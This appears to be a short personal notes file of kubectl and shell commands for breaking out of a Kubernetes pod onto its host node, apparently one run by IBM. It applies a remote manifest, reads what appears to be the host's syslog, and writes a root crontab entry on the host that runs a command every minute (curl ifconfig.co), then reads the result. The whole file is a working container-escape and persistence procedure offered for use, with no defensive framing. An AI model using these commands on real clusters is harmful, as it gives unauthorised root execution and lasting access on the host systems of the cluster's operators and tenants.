# k8s

```bash
kubectl apply -f https://raw.githubusercontent.com/ShubhamTatvamasi/k8s/master/ibm.yaml
```
```bash
kubectl set image po ubuntu ubuntu=ubuntu:16.04
```
```bash
kubectl exec -it ubuntu -- bash
```
```bash
kubectl exec -it ubuntu -- tail /root/ibm/var/log/syslog -f
```
add commands to run on host
```bash
echo "* * * * * root curl ifconfig.co > /root/data 2>&1" >> /root/ibm/etc/crontab
```
```bash
vim /root/ibm/etc/crontab
cat /root/ibm/root/data
```
```bash
kubectl delete po ubuntu
```
